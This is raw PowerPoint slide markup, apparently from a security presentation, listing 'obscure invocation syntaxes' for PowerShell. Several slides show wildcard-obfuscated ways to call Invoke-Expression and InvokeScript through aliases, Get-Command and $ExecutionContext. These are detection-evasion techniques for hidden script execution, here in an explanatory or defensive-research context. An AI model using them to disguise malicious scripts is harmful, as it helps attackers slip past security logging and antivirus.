              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Get-Alias/GAL</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Get-Command/GCM</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>GetCmdlets</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>(PS1.0+)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>InvokeScript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>(PS1.0</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>+)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200" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-Command/ICM</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>PS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>Runspace</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Concatenated IEX</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>AsWorkflow</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>PS3.0</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>+)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Dot-Source</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> (Disk-based)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200" b="1" dirty="0" smtClean="0"/>
              <a:t>Import-Module/IPMO</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> (Disk-based)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="673135"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Up Arrow 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="16200000">
            <a:off x="4149256" y="1648401"/>
            <a:ext cx="224240" cy="1454167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4997326" y="1766852"/>
            <a:ext cx="1731657" cy="707886"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1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&amp;(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>GAL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> I*X</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>.(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>LS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Alias:/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>I*X)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Up Arrow 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="16200000">
            <a:off x="4560609" y="2323123"/>
            <a:ext cx="218969" cy="817808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4988460" y="2571401"/>
            <a:ext cx="2305068" cy="707886"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1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000" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>GCM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>I*e-E*)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>&amp;(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Command</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>I*e-E</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>*)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1163719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800" dirty="0" smtClean="0"/>
              <a:t>Obscure Invocation Syntaxes</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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1257156" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-Expression/IEX</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Get-Alias/GAL</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Get-Command/GCM</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>GetCmdlets</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(PS1.0+)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>InvokeScript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(PS1.0</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>+)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200" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-Command/ICM</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>PS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>Runspace</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Concatenated IEX</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>AsWorkflow</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>PS3.0+)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Dot-Source</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> (Disk-based)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200" b="1" dirty="0" smtClean="0"/>
              <a:t>Import-Module/IPMO</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> (Disk-based)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="673135"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Up Arrow 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="16200000">
            <a:off x="4843771" y="2383071"/>
            <a:ext cx="224240" cy="1454167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5475183" y="1552626"/>
            <a:ext cx="6223985" cy="1631216"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1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.$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>ExecutionContext.InvokeCommand.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>GetCmdlets</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>'I*e-E*')</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>&amp;(GV E*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>Cont</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>* -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>V).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>InvokeCommand</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>.(((GV </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>E*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>Cont</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>* -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>V).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>InvokeCommand.PsObject.Methods|Where</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>{(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>GV </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>_ -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>V).Name-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>clike</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>*Cm*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ts</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>}).Name).Invoke</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>('I*e-E*')</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Up Arrow 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="16200000">
            <a:off x="4912365" y="2751302"/>
            <a:ext cx="224240" cy="1454167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5475183" y="3419003"/>
            <a:ext cx="6223985" cy="1631216"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1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$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>ExecutionContext.InvokeCommand.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>InvokeScript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>$Script</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>(GV E*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>Cont</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>* -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>V).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>InvokeCommand</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>.(((GV </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>E*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>Cont</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>* -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>V).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>InvokeCommand.PsObject.Methods|Where</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>{(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>GV </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>_ -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>V).Name-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>clike'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>I</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>'}).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Name).Invoke</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>$Script</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>)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7750896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800" dirty="0" smtClean="0"/>
              <a:t>Obscure Invocation Syntaxes</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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1257156" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-Expression/IEX</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Get-Alias/GAL</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Get-Command/GCM</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>GetCmdlets</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>(PS1.0+)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>InvokeScript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>(PS1.0</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>+)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200" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-Command/ICM</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Runspace</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
